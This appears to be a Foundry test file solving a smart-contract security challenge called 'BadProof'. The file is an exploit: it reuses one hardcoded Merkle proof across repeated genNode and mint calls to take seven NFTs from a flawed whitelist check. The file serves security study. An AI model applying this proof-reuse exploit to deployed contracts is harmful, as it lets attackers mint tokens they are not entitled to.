// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import {Test, console2} from "forge-std/Test.sol";
import {BadProofBaseTest} from "./BadProofBase.t.sol";

interface IBadProof {
    function mint(address addr, bytes32[] memory proof) external;
    function genNode(address addr, uint256 tokenId) external returns (bytes32);
}

contract BadProofTest is BadProofBaseTest, ERC721Holder {
    function testExploit() external validation {
        bytes32[] memory proof = new bytes32[](3);
        proof[0] = 0xc471bda26e2e9f486b58f8f86bf6b700bb9d0db6dafabec4ee3f352a216fc396;
        proof[1] = 0x2357f919416fa706364ed9497630e70c41e2e43d16665f71375e9fef824c381c;
        proof[2] = 0x7410dc0396cf7f6d7d7be35e28840e3af1ec80b7bf609b2b650a8d3534ddaa12;

        // Try with the original proof using this contract's address
        IBadProof(address(token)).genNode(address(this), 1);
        IBadProof(address(token)).mint(address(this), proof);
        IBadProof(address(token)).genNode(address(this), 2);
        IBadProof(address(token)).mint(address(this), proof);
        IBadProof(address(token)).genNode(address(this), 3);
        IBadProof(address(token)).mint(address(this), proof);
        IBadProof(address(token)).genNode(address(this), 4);
        IBadProof(address(token)).mint(address(this), proof);
        IBadProof(address(token)).genNode(address(this), 5);
        IBadProof(address(token)).mint(address(this), proof);
        IBadProof(address(token)).genNode(address(this), 6);
        IBadProof(address(token)).mint(address(this), proof);
        IBadProof(address(token)).genNode(address(this), 7);
        IBadProof(address(token)).mint(address(this), proof);
    }
}